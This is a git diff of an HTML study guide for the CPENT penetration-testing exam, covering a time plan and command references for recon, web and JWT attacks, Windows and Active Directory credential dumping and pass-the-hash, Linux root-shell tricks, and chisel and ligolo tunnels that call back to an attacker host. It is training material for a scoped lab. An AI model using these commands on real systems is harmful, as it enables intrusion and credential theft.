+  <ol class="mods">
+    <li><span class="mn">01</span><span class="mt">Introduction to Penetration Testing &amp; Methodologies<span>Frameworks, PTES, scoping mindset</span></span></li>
+    <li><span class="mn">02</span><span class="mt">Penetration Testing Scoping &amp; Engagement<span>Rules of engagement, legal, scope</span></span></li>
+    <li><span class="mn">03</span><span class="mt">Open-Source Intelligence (OSINT)<span>Passive recon, footprinting</span></span></li>
+    <li><span class="mn">04</span><span class="mt">Social Engineering Penetration Testing<span>Pretext, phishing, the human layer</span></span></li>
+    <li><span class="mn">05</span><span class="mt">Web Application Penetration Testing<span>OWASP, injection, auth flaws</span></span></li>
+    <li><span class="mn">06</span><span class="mt">API &amp; Java Web Token Penetration Testing<span>BOLA / IDOR, JWT attacks</span></span></li>
+    <li><span class="mn">07</span><span class="mt">Perimeter Defense Evasion Techniques<span>Firewall, IDS / IPS, WAF bypass</span></span></li>
+    <li><span class="mn">08</span><span class="mt">Windows Exploitation &amp; Privilege Escalation<span>Tokens, services, misconfig</span></span></li>
+    <li><span class="mn">09</span><span class="mt">Active Directory Penetration Testing<span>Kerberos, ACLs, DCSync</span></span></li>
+    <li><span class="mn">10</span><span class="mt">Linux Exploitation &amp; Privilege Escalation<span>SUID, sudo, capabilities, cron</span></span></li>
+    <li><span class="mn">11</span><span class="mt">Reverse Engineering, Fuzzing &amp; Binary Exploitation<span>Stack overflows, 32 &amp; 64-bit</span></span></li>
+    <li><span class="mn">12</span><span class="mt">Lateral Movement &amp; Pivoting<span>Tunnels, double pivot, hidden nets</span></span></li>
+    <li><span class="mn">13</span><span class="mt">IoT Penetration Testing<span>Firmware, protocols, hardware</span></span></li>
+    <li><span class="mn">14</span><span class="mt">Report Writing &amp; Post-Testing Actions<span>Findings, PoC, remediation</span></span></li>
+  </ol>
+  <p>Operational technology, wireless and cloud work are folded into the modules above and the range challenges rather than listed as standalone chapters. OT / SCADA is an advanced range skill, covered in <a class="inl" href="#s12">Section 12</a>. Do not assume a topic is out of scope just because it is not a numbered module title.</p>
+</section>
 
-<!-- 03 H4H -->
-<div class="sec" id="s3">
-  <div class="sec-eyebrow">Section 03</div>
-  <h2 class="sec-title"><span class="sec-num">03</span> Hackers 4 Humanity 2026</h2>
-  <div class="sec-divider"></div>
-  <p>If you are looking at CPENT right now, this is why. EC-Council's <strong>Hackers 4 Humanity</strong> invites experienced penetration testers to sit a fully sponsored CPENT AI exam. You do not donate money. You donate skill.</p>
-  <div class="callout">
-    <div class="callout-tag">◆ EC-Council initiative · 2026</div>
-    <h3>Pass a sponsored exam, fund someone else's start</h3>
-    <p>For every professional who passes, EC-Council commits <strong>$1,000 of cybersecurity training</strong> to underprivileged learners through vetted non-profit partners. Score 90% or more and you are named one of the <strong>1,000 Great Pen Testers of 2026</strong>, recognised on stage at Hacker Halted, streamed globally.</p>
-    <div class="h4h-stats">
-      <div class="h4h-stat"><div class="num">1,000</div><div class="lbl">SPONSORED EXAMS</div></div>
-      <div class="h4h-stat"><div class="num">$1,000</div><div class="lbl">DONATED PER PASS</div></div>
-      <div class="h4h-stat"><div class="num">$1M</div><div class="lbl">TOTAL TARGET IMPACT</div></div>
-      <div class="h4h-stat"><div class="num">90%+</div><div class="lbl">= HALL OF FAME</div></div>
+<!-- 03 -->
+<section class="sec" id="s3">
+  <div class="sec-h"><span class="n">03</span><h2>Hackers 4 Humanity 2026</h2></div>
+  <p>If you are looking at CPENT right now, this is often why. EC-Council&rsquo;s <strong>Hackers 4 Humanity</strong> invites experienced penetration testers to sit a fully sponsored CPENT AI exam. You do not donate money. You donate skill.</p>
+  <div class="panel">
+    <h3>Pass a sponsored exam, fund someone else&rsquo;s start</h3>
+    <p>For every professional who passes, EC-Council commits <strong>$1,000 of cybersecurity training</strong> to underprivileged learners through vetted non-profit partners. Score 90% or more and you are named one of the <strong>1,000 Great Pen Testers of 2026</strong>, recognised on stage at Hacker Halted and streamed globally.</p>
+    <div class="figs">
+      <div class="fig"><div class="num">1,000</div><div class="lbl">sponsored exams</div></div>
+      <div class="fig"><div class="num">$1,000</div><div class="lbl">donated per pass</div></div>
+      <div class="fig"><div class="num">$1M</div><div class="lbl">total target impact</div></div>
+      <div class="fig"><div class="num">90%+</div><div class="lbl">= Hall of Fame</div></div>
     </div>
   </div>
   <div class="tbl-wrap"><table>
-    <tr><th>Detail</th><th>What to know</th></tr>
-    <tr><td><b>Who can apply</b></td><td>Active penetration testers with verifiable experience, or CEH-certified (or equivalent) with 2+ years in information security. You must not already hold CPENT AI.</td></tr>
-    <tr><td><b>Nomination window</b></td><td>Roughly May 1 to early October 2026. Self-nominate or nominate a peer through EC-Council's form.</td></tr>
-    <tr><td><b>After approval</b></td><td>You have about 30 days to sit the exam; late approvals finish by end of October 2026.</td></tr>
-    <tr><td><b>Report</b></td><td>Submit your penetration test report within 7 days of your final session, same as a normal CPENT attempt.</td></tr>
-    <tr><td><b>Recognition</b></td><td>90%+ scorers named among the 1,000 Great Pen Testers and inducted at Hacker Halted, late 2026.</td></tr>
+    <thead><tr><th>Detail</th><th>What to know</th></tr></thead>
+    <tbody>
+    <tr><td>Who can apply</td><td>Active penetration testers with verifiable experience, or CEH-certified (or equivalent) with 2+ years in information security. You must not already hold CPENT AI.</td></tr>
+    <tr><td>Nomination window</td><td>Roughly May 1 to early October 2026. Self-nominate or nominate a peer through EC-Council&rsquo;s form.</td></tr>
+    <tr><td>After approval</td><td>You have about 30 days to sit the exam; late approvals finish by end of October 2026.</td></tr>
+    <tr><td>Report</td><td>Submit your penetration test report within 7 days of the final session, same as a normal attempt.</td></tr>
+    <tr><td>Recognition</td><td>90%+ scorers named among the 1,000 Great Pen Testers and inducted at Hacker Halted, late 2026.</td></tr>
+    </tbody>
   </table></div>
-  <div class="note n-warn">
-    <div class="note-icon">⚠️</div>
-    <div class="note-body"><div class="note-title">Verify dates before you rely on them</div>
-      <p>Programme dates, eligibility and partner details are set by EC-Council and can change. Confirm the current terms on the official <a class="inl" href="https://www.eccouncil.org/hackers4humanity/" target="_blank" rel="noopener">Hackers 4 Humanity</a> page before nominating. This section is a summary, not the terms of entry.</p>
-    </div>
+  <div class="callout">
+    <div class="cl-label">Verify before you rely on it</div>
+    <p>Programme dates, eligibility and partners are set by EC-Council and can change. Confirm the current terms on the official <a class="inl" href="https://www.eccouncil.org/hackers4humanity/" target="_blank" rel="noopener">Hackers 4 Humanity</a> page before nominating. This is a summary, not the terms of entry.</p>
   </div>
-</div>
+</section>
 
-<div class="part-label">Part II · The 24-hour game plan</div>
+<p class="part">Part II &mdash; The 24-hour game plan</p>
 
-<!-- 04 PLAN -->
-<div class="sec" id="s4">
-  <div class="sec-eyebrow">Section 04</div>
-  <h2 class="sec-title"><span class="sec-num">04</span> A time plan that survives the range</h2>
-  <div class="sec-divider"></div>
+<!-- 04 -->
+<section class="sec" id="s4">
+  <div class="sec-h"><span class="n">04</span><h2>A time plan that survives the range</h2></div>
   <p>Most CPENT failures are not skill failures. They are <strong>time failures</strong>: eight hours lost in one rabbit hole, or a pivot attempted too late to reach the networks behind it. Split the clock into two 12-hour sessions if you can, sleep between them, and treat the plan below as a budget you actively defend.</p>
   <div class="tbl-wrap"><table>
-    <tr><th>Window</th><th>Focus</th><th>The discipline</th></tr>
-    <tr><td><b>0:00–1:00</b></td><td>Full-scope sweep</td><td>Kick off a background <code>-p-</code> scan on everything in scope before touching a single box. Never let the network go un-enumerated while you work one host.</td></tr>
-    <tr><td><b>1:00–4:00</b></td><td>Low-hanging fruit</td><td>Bank the easy flags: exposed web apps, default creds, obvious CVEs. Points early buy calm later.</td></tr>
-    <tr><td><b>4:00–7:00</b></td><td>First foothold + pivot</td><td>Get a shell that reaches a new segment, then <strong>pivot immediately</strong>. Hidden networks are where the marks are; reach them early.</td></tr>
-    <tr><td><b>7:00–10:00</b></td><td>AD / internal</td><td>Enumerate the domain, Kerberoast, chase a path to Domain Admin with BloodHound. This is dense, high-value ground.</td></tr>
-    <tr><td><b>10:00–12:00</b></td><td>Checkpoint + report</td><td>Stop. Back up notes, write findings while fresh, snapshot progress. End session one clean.</td></tr>
-    <tr><td><b>12:00–18:00</b></td><td>Binaries + hard targets</td><td>Fresh brain on the buffer overflow and reverse-engineering challenges. These reward patience, not panic.</td></tr>
-    <tr><td><b>18:00–22:00</b></td><td>Double pivot + cleanup</td><td>Reach the deepest segment, collect remaining flags, re-try anything parked earlier with new access.</td></tr>
-    <tr><td><b>22:00–24:00</b></td><td>Evidence lock</td><td>Confirm every claimed flag has a screenshot and a repeatable command. No proof, no points.</td></tr>
+    <thead><tr><th>Window</th><th>Focus</th><th>The discipline</th></tr></thead>
+    <tbody>
+    <tr><td>0:00&ndash;1:00</td><td>Full-scope sweep</td><td>Kick off a background <code>-p-</code> scan across everything in scope before touching a single box. Never let the network sit un-enumerated while you work one host.</td></tr>
+    <tr><td>1:00&ndash;4:00</td><td>Low-hanging fruit</td><td>Bank the easy flags: exposed web apps, default creds, obvious CVEs. Points early buy calm later.</td></tr>
+    <tr><td>4:00&ndash;7:00</td><td>Foothold &amp; pivot</td><td>Get a shell that reaches a new segment, then pivot immediately. Hidden networks hold the marks; reach them early.</td></tr>
+    <tr><td>7:00&ndash;10:00</td><td>AD / internal</td><td>Enumerate the domain, Kerberoast, chase a path to Domain Admin with BloodHound. Dense, high-value ground.</td></tr>
+    <tr><td>10:00&ndash;12:00</td><td>Checkpoint</td><td>Stop. Back up notes, write findings while fresh, snapshot progress. End session one clean.</td></tr>
+    <tr><td>12:00&ndash;18:00</td><td>Binaries &amp; hard targets</td><td>Fresh brain on the buffer overflow and reverse-engineering challenges. These reward patience, not panic.</td></tr>
+    <tr><td>18:00&ndash;22:00</td><td>Double pivot &amp; cleanup</td><td>Reach the deepest segment, collect remaining flags, re-try anything parked earlier with new access.</td></tr>
+    <tr><td>22:00&ndash;24:00</td><td>Evidence lock</td><td>Confirm every claimed flag has a screenshot and a repeatable command. No proof, no points.</td></tr>
+    </tbody>
   </table></div>
-  <div class="note n-crit">
-    <div class="note-icon">⛔</div>
-    <div class="note-body"><div class="note-title">The 45-minute rule</div>
-      <p>If a target has not moved in 45 minutes, park it with a note and move on. The range is chained, and unrelated points are still points. You come back with a clearer head and, often, new credentials or a new pivot that cracks it open.</p>
-    </div>
+  <div class="callout key">
+    <div class="cl-label">The 45-minute rule</div>
+    <p>If a target has not moved in 45 minutes, park it with a note and move on. The range is chained, and unrelated points are still points. You return with a clearer head and, often, new credentials or a new pivot that cracks it open.</p>
   </div>
-  <div class="note n-ok">
-    <div class="note-icon">💾</div>
-    <div class="note-body"><div class="note-title">Note as you breathe</div>
-      <p>Keep one running log per host: IP, open ports, creds found, exploit used, flag, and the exact command with a timestamped screenshot. CherryTree, Obsidian or a plain markdown file all work. Your report is 80% written by the time the range closes if you do this.</p>
-    </div>
-  </div>
-</div>
+  <p>Keep one running log per host: IP, open ports, credentials found, exploit used, flag, and the exact command with a timestamped screenshot. Do this and your report is most of the way written by the time the range closes.</p>
+</section>
 
-<div id="coaching-cta-strip" data-lead="Preparing for CPENT with a job in mind?" data-tail="I mentor pentesters through exactly this ground, 1:1, from first Nmap to the report. Free intake call first." style="min-height:64px;margin:8px 0 40px"></div>
+<p class="part">Part III &mdash; Command references</p>
 
-<div class="part-label">Part III · Command references</div>
-
-<!-- 05 RECON -->
-<div class="sec" id="s5">
-  <div class="sec-eyebrow">Section 05 · Modules 03–04</div>
-  <h2 class="sec-title"><span class="sec-num">05</span> Recon, OSINT &amp; scoping</h2>
-  <div class="sec-divider"></div>
+<!-- 05 -->
+<section class="sec" id="s5">
+  <div class="sec-h"><span class="n">05</span><h2>Recon, OSINT &amp; scoping</h2></div>
   <p>Passive first, then active. Map the attack surface before you make noise. In a scoped exam the OSINT points are fast and cheap.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>kali · passive &amp; active recon</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+  <div class="code">
+    <div class="code-top"><span class="code-label">passive &amp; active recon</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># Subdomains &amp; DNS</span>
 theHarvester -d target.com -b all
 subfinder -d target.com | httpx -sc -title
-dnsrecon -d target.com -a          <span class="cm"># axfr zone transfer attempt</span>
+dnsrecon -d target.com -a          <span class="cm"># attempt an AXFR zone transfer</span>
 dig axfr target.com @ns1.target.com
 
 <span class="cm"># Live hosts on a scoped range</span>
@@ -486,20 +448,17 @@ fping -a -g 10.10.10.0/24 2&gt;/dev/null
 
 <span class="cm"># Attack-surface OSINT</span>
 whatweb https://target.com
-shodan host 203.0.113.10           <span class="cm"># exposed services, banners</span>
-</pre>
+shodan host 203.0.113.10           <span class="cm"># exposed services, banners</span></pre>
   </div>
-  <div class="note n-info"><div class="note-icon">🧠</div><div class="note-body"><div class="note-title">CPENT AI angle</div><p>The AI-assisted flow expects you to feed recon output into an assistant for triage: rank hosts by exploitability, summarise a large Nmap output, suggest a first exploit. Use it to prioritise, then verify by hand. The range still scores the actual exploit, not the suggestion.</p></div></div>
-</div>
+  <p>The AI-assisted flow expects you to feed recon output into an assistant for triage: rank hosts by exploitability, summarise a large Nmap output, suggest a first exploit. Use it to prioritise, then verify by hand. The range scores the actual exploit, not the suggestion.</p>
+</section>
 
-<!-- 06 NETWORK -->
-<div class="sec" id="s6">
-  <div class="sec-eyebrow">Section 06 · Modules 05 &amp; 07</div>
-  <h2 class="sec-title"><span class="sec-num">06</span> Network, perimeter &amp; service enumeration</h2>
-  <div class="sec-divider"></div>
-  <p>Nmap is the workhorse. Know the full-port sweep, service/version detection, the scripting engine, and the evasion flags for perimeter devices.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>kali · nmap</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+<!-- 06 -->
+<section class="sec" id="s6">
+  <div class="sec-h"><span class="n">06</span><h2>Network, perimeter &amp; service enumeration</h2></div>
+  <p>Nmap is the workhorse. Know the full-port sweep, service and version detection, the scripting engine, and the evasion flags for perimeter devices.</p>
+  <div class="code">
+    <div class="code-top"><span class="code-label">nmap</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># The one-two: fast full sweep, then deep on what is open</span>
 nmap -p- --min-rate 2000 -T4 10.10.10.5 -oN all-ports.txt
 nmap -sC -sV -p 22,80,445,3389 10.10.10.5 -oA deep
@@ -511,40 +470,38 @@ nmap --script "vuln" -p 445 10.10.10.5    <span class="cm"># NSE vuln category</
 nmap -sA -p 1-1000 10.10.10.5             <span class="cm"># ACK scan: map firewall rules</span>
 nmap -f --mtu 16 10.10.10.5               <span class="cm"># fragment packets</span>
 nmap -D RND:10 10.10.10.5                 <span class="cm"># decoys</span>
-nmap -g 53 -sS 10.10.10.5                 <span class="cm"># source port 53, trusted</span>
-</pre>
+nmap -g 53 -sS 10.10.10.5                 <span class="cm"># source port 53, often trusted</span></pre>
   </div>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-tgt"></span>service enumeration</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+  <div class="code">
+    <div class="code-top"><span class="code-label">service enumeration</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># SMB (445)</span>
 enum4linux-ng -A 10.10.10.5
-smbclient -L //10.10.10.5/ -N          <span class="cm"># null session share list</span>
+smbclient -L //10.10.10.5/ -N          <span class="cm"># null-session share list</span>
 crackmapexec smb 10.10.10.5 -u '' -p ''
 
 <span class="cm"># LDAP (389) · SNMP (161) · NFS (2049)</span>
 ldapsearch -x -H ldap://10.10.10.5 -s base namingcontexts
 snmpwalk -v2c -c public 10.10.10.5
-showmount -e 10.10.10.5
-</pre>
+showmount -e 10.10.10.5</pre>
   </div>
   <div class="tbl-wrap"><table>
-    <tr><th>Port</th><th>Service</th><th>First move</th></tr>
-    <tr><td class="cmd">21</td><td>FTP</td><td>Anonymous login, then check writable dirs for web-root upload</td></tr>
-    <tr><td class="cmd">445</td><td>SMB</td><td>Null session, share enum, EternalBlue/CVE checks, then creds</td></tr>
-    <tr><td class="cmd">161</td><td>SNMP</td><td><code>public</code> community string leaks users, routes, processes</td></tr>
-    <tr><td class="cmd">1433</td><td>MSSQL</td><td><code>xp_cmdshell</code>, linked servers, service-account privesc</td></tr>
-    <tr><td class="cmd">3389</td><td>RDP</td><td>Once you have creds; check NLA and password reuse</td></tr>
+    <thead><tr><th>Port</th><th>Service</th><th>First move</th></tr></thead>
+    <tbody>
+    <tr><td class="mono">21</td><td>FTP</td><td>Anonymous login, then check writable dirs for web-root upload</td></tr>
+    <tr><td class="mono">445</td><td>SMB</td><td>Null session, share enum, EternalBlue / CVE checks, then creds</td></tr>
+    <tr><td class="mono">161</td><td>SNMP</td><td><code>public</code> community string leaks users, routes, processes</td></tr>
+    <tr><td class="mono">1433</td><td>MSSQL</td><td><code>xp_cmdshell</code>, linked servers, service-account privesc</td></tr>
+    <tr><td class="mono">3389</td><td>RDP</td><td>Once you have creds; check NLA and password reuse</td></tr>
+    </tbody>
   </table></div>
-</div>
+</section>
 
-<!-- 07 WEB -->
-<div class="sec" id="s7">
-  <div class="sec-eyebrow">Section 07 · Modules 05–06</div>
-  <h2 class="sec-title"><span class="sec-num">07</span> Web application &amp; API / JWT</h2>
-  <div class="sec-divider"></div>
-  <p>Content discovery, then injection and access-control flaws. The dedicated API and JSON Web Token module means IDOR/BOLA and JWT attacks are fair game, not just classic OWASP injection.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>kali · web discovery &amp; injection</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+<!-- 07 -->
+<section class="sec" id="s7">
+  <div class="sec-h"><span class="n">07</span><h2>Web application &amp; API / JWT</h2></div>
+  <p>Content discovery, then injection and access-control flaws. The dedicated API and JSON Web Token module means IDOR / BOLA and JWT attacks are fair game, not just classic OWASP injection.</p>
+  <div class="code">
+    <div class="code-top"><span class="code-label">web discovery &amp; injection</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># Content &amp; vhost discovery</span>
 ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403
 ffuf -u https://target -H "Host: FUZZ.target" -w subdomains.txt -fs 0
@@ -553,46 +510,48 @@ gobuster dir -u https://target -w raft-medium-words.txt -x php,txt
 <span class="cm"># Injection</span>
 sqlmap -u "https://target/item?id=1" --batch --dbs
 sqlmap -r request.txt --batch --dump    <span class="cm"># from a saved Burp request</span>
-nikto -h https://target
-</pre>
+nikto -h https://target</pre>
   </div>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-tgt"></span>API &amp; JWT attacks</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+  <div class="code">
+    <div class="code-top"><span class="code-label">API &amp; JWT attacks</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># IDOR / BOLA: iterate object IDs across another user's context</span>
 ffuf -u https://target/api/v1/users/FUZZ/orders -w ids.txt \
      -H "Authorization: Bearer &lt;low-priv-token&gt;" -mc 200
 
 <span class="cm"># JWT: inspect, tamper, crack</span>
-jwt_tool &lt;token&gt;                        <span class="cm"># decode header/payload</span>
+jwt_tool &lt;token&gt;                        <span class="cm"># decode header / payload</span>
 jwt_tool &lt;token&gt; -X a                    <span class="cm"># alg:none bypass</span>
 jwt_tool &lt;token&gt; -C -d wordlist.txt      <span class="cm"># brute the HS256 secret</span>
-hashcat -m 16500 jwt.txt rockyou.txt     <span class="cm"># crack signing key</span>
-</pre>
+hashcat -m 16500 jwt.txt rockyou.txt     <span class="cm"># crack the signing key</span></pre>
   </div>
-  <div class="note n-warn"><div class="note-icon">🔑</div><div class="note-body"><div class="note-title">The three JWT wins</div><p><strong>1.</strong> <code>alg:none</code> — server trusts an unsigned token. <strong>2.</strong> Weak HS256 secret you can crack, then forge admin claims. <strong>3.</strong> Algorithm confusion — sign with the public key as an HMAC secret when the server expects RS256. Try them in that order.</p></div></div>
-</div>
+  <div class="callout">
+    <div class="cl-label">The three JWT wins, in order</div>
+    <ul>
+      <li><strong>alg:none</strong> &mdash; the server trusts an unsigned token.</li>
+      <li><strong>Weak HS256 secret</strong> you can crack, then forge admin claims.</li>
+      <li><strong>Algorithm confusion</strong> &mdash; sign with the public key as an HMAC secret when the server expects RS256.</li>
+    </ul>
+  </div>
+</section>
 
-<!-- 08 AD/WIN -->
-<div class="sec" id="s8">
-  <div class="sec-eyebrow">Section 08 · Modules 08–09</div>
-  <h2 class="sec-title"><span class="sec-num">08</span> Windows &amp; Active Directory</h2>
-  <div class="sec-divider"></div>
-  <p>The densest scoring ground on the range. Local privesc gets you SYSTEM on a box; AD attacks get you the domain. Enumerate first, then pick the shortest path.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-win"></span>windows local privesc</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+<!-- 08 -->
+<section class="sec" id="s8">
+  <div class="sec-h"><span class="n">08</span><h2>Windows &amp; Active Directory</h2></div>
+  <p>The densest scoring ground on the range. Local privilege escalation gets you SYSTEM on a box; AD attacks get you the domain. Enumerate first, then take the shortest path.</p>
+  <div class="code">
+    <div class="code-top"><span class="code-label">windows local privilege escalation</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre>whoami /priv                              <span class="cm"># the whole game is in here</span>
 winPEASx64.exe quiet                      <span class="cm"># or PowerUp Invoke-AllChecks</span>
 
 <span class="cm"># SeImpersonate / SeAssignPrimaryToken -&gt; SYSTEM</span>
 PrintSpoofer.exe -i -c cmd
-GodPotato -cmd "cmd /c whoami"            <span class="cm"># modern potato, 2019/2022</span>
+GodPotato -cmd "cmd /c whoami"            <span class="cm"># modern potato, 2019 / 2022</span>
 
-<span class="cm"># Unquoted service paths, weak service perms, AlwaysInstallElevated</span>
-</pre>
+<span class="cm"># Also: unquoted service paths, weak service perms, AlwaysInstallElevated</span></pre>
   </div>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>AD enumeration &amp; attacks</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
-<pre><span class="cm"># Map the domain (run BloodHound, then read the shortest path)</span>
+  <div class="code">
+    <div class="code-top"><span class="code-label">AD enumeration &amp; attacks</span><button class="copy" onclick="cp(this)">Copy</button></div>
+<pre><span class="cm"># Map the domain, then read the shortest path in BloodHound</span>
 bloodhound-python -u user -p pass -d corp.local -c all -ns 10.10.10.5
 <span class="cm"># or on-host: SharpHound.exe -c All</span>
 
@@ -607,26 +566,25 @@ hashcat -m 18200 asrep.txt rockyou.txt
 <span class="cm"># Move &amp; dump once you have a hash or password</span>
 impacket-secretsdump corp.local/user:pass@10.10.10.5
 evil-winrm -i 10.10.10.5 -u admin -H &lt;NTLM-hash&gt;   <span class="cm"># pass-the-hash</span>
-impacket-psexec corp.local/admin@10.10.10.5 -hashes :&lt;NTLM&gt;
-</pre>
+impacket-psexec corp.local/admin@10.10.10.5 -hashes :&lt;NTLM&gt;</pre>
   </div>
   <div class="tbl-wrap"><table>
-    <tr><th>Attack</th><th>Precondition</th><th>hashcat mode</th></tr>
-    <tr><td>Kerberoasting</td><td>Any domain user; target has an SPN</td><td class="cmd">13100</td></tr>
-    <tr><td>AS-REP roasting</td><td>Account with pre-auth disabled</td><td class="cmd">18200</td></tr>
-    <tr><td>NTLMv2 capture</td><td>Responder / relay on the segment</td><td class="cmd">5600</td></tr>
-    <tr><td>DCSync</td><td>Replication rights (often via ACL abuse)</td><td>secretsdump</td></tr>
+    <thead><tr><th>Attack</th><th>Precondition</th><th class="mono">hashcat</th></tr></thead>
+    <tbody>
+    <tr><td>Kerberoasting</td><td>Any domain user; the target has an SPN</td><td class="mono">13100</td></tr>
+    <tr><td>AS-REP roasting</td><td>Account with pre-auth disabled</td><td class="mono">18200</td></tr>
+    <tr><td>NTLMv2 capture</td><td>Responder / relay on the segment</td><td class="mono">5600</td></tr>
+    <tr><td>DCSync</td><td>Replication rights, often via ACL abuse</td><td class="mono">secretsdump</td></tr>
+    </tbody>
   </table></div>
-</div>
+</section>
 
-<!-- 09 LINUX -->
-<div class="sec" id="s9">
-  <div class="sec-eyebrow">Section 09 · Module 10</div>
-  <h2 class="sec-title"><span class="sec-num">09</span> Linux exploitation &amp; privilege escalation</h2>
-  <div class="sec-divider"></div>
-  <p>Run the enumerator, then work the five classic vectors: sudo rules, SUID binaries, capabilities, cron and writable paths. GTFOBins turns almost any of them into a root shell.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>linux privesc checklist</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+<!-- 09 -->
+<section class="sec" id="s9">
+  <div class="sec-h"><span class="n">09</span><h2>Linux exploitation &amp; privilege escalation</h2></div>
+  <p>Run the enumerator, then work the five classic vectors: sudo rules, SUID binaries, capabilities, cron, and writable paths. GTFOBins turns almost any of them into a root shell.</p>
+  <div class="code">
+    <div class="code-top"><span class="code-label">linux privesc checklist</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre>./linpeas.sh -a | tee linpeas.txt
 
 sudo -l                                   <span class="cm"># NOPASSWD entries -&gt; GTFOBins</span>
@@ -635,33 +593,28 @@ getcap -r / 2&gt;/dev/null                    <span class="cm"># cap_setuid=ep i
 cat /etc/crontab; ls -la /etc/cron.*      <span class="cm"># writable script run as root</span>
 
 <span class="cm"># Examples via GTFOBins</span>
-sudo find . -exec /bin/sh \; -quit        <span class="cm"># if sudo find is allowed</span>
-./cap_binary -c 'import os; os.setuid(0); os.system("/bin/sh")'
-</pre>
+sudo find . -exec /bin/sh \; -quit        <span class="cm"># if sudo find is allowed</span></pre>
   </div>
-  <div class="note n-info"><div class="note-icon">📕</div><div class="note-body"><div class="note-title">Memorise the workflow, not the exploits</div><p>You will not recall every SUID trick. You will recall: run linpeas, note anything unusual, look it up on GTFOBins, get root. Kernel exploits (DirtyPipe, PwnKit) are a fallback when config is clean, not a first move; they are noisy and can crash the box.</p></div></div>
-</div>
+  <p>Memorise the workflow, not the exploits: run linpeas, note anything unusual, look it up on GTFOBins, get root. Kernel exploits such as DirtyPipe or PwnKit are a fallback when the configuration is clean, not a first move; they are noisy and can crash the box.</p>
+</section>
 
-<!-- 10 PIVOTING -->
-<div class="sec" id="s10">
-  <div class="sec-eyebrow">Section 10 · Module 12</div>
-  <h2 class="sec-title"><span class="sec-num">10</span> Pivoting, tunnelling &amp; the double pivot</h2>
-  <div class="sec-divider"></div>
-  <p>This is what makes CPENT CPENT. Hidden segments sit behind compromised hosts, and the highest-value flags live there. The <strong>double pivot</strong>, routing through two chained hosts to reach a third network, is a signature exam skill. Practise it cold.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>ssh &amp; proxychains</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+<!-- 10 -->
+<section class="sec" id="s10">
+  <div class="sec-h"><span class="n">10</span><h2>Pivoting, tunnelling &amp; the double pivot</h2></div>
+  <p>This is what makes CPENT CPENT. Hidden segments sit behind compromised hosts, and the highest-value flags live there. The <strong>double pivot</strong> &mdash; routing through two chained hosts to reach a third network &mdash; is a signature exam skill. Practise it until it is cold.</p>
+  <div class="code">
+    <div class="code-top"><span class="code-label">ssh &amp; proxychains</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># Dynamic SOCKS proxy through a foothold (single pivot)</span>
 ssh -D 1080 -N user@10.10.10.5           <span class="cm"># then set socks5 127.0.0.1 1080</span>
 proxychains nmap -sT -Pn 172.16.5.0/24   <span class="cm"># scan the hidden net</span>
 
 <span class="cm"># Local / remote forwards for a single port</span>
 ssh -L 8000:172.16.5.10:80 user@10.10.10.5   <span class="cm"># reach their :80 locally</span>
-ssh -R 9001:127.0.0.1:9001 user@10.10.10.5   <span class="cm"># pull a callback back to you</span>
-</pre>
+ssh -R 9001:127.0.0.1:9001 user@10.10.10.5   <span class="cm"># pull a callback back to you</span></pre>
   </div>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-tgt"></span>chisel &amp; ligolo-ng (agentless-feel tunnels)</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
-<pre><span class="cm"># chisel reverse SOCKS: attacker=server, pivot host=client</span>
+  <div class="code">
+    <div class="code-top"><span class="code-label">chisel &amp; ligolo-ng</span><button class="copy" onclick="cp(this)">Copy</button></div>
+<pre><span class="cm"># chisel reverse SOCKS: attacker = server, pivot host = client</span>
 <span class="pr">attacker&gt;</span> chisel server -p 8080 --reverse
 <span class="pr">pivot&gt;</span>    chisel client ATTACKER:8080 R:socks
 
@@ -669,55 +622,54 @@ ssh -R 9001:127.0.0.1:9001 user@10.10.10.5   <span class="cm"># pull a callback 
 <span class="pr">attacker&gt;</span> ./proxy -selfcert
 <span class="pr">pivot1&gt;</span>   ./agent -connect ATTACKER:11601 -ignore-cert
 <span class="cm"># add a route to the hidden net, then repeat the agent on pivot2</span>
-sudo ip route add 172.16.5.0/24 dev ligolo
-</pre>
+sudo ip route add 172.16.5.0/24 dev ligolo</pre>
   </div>
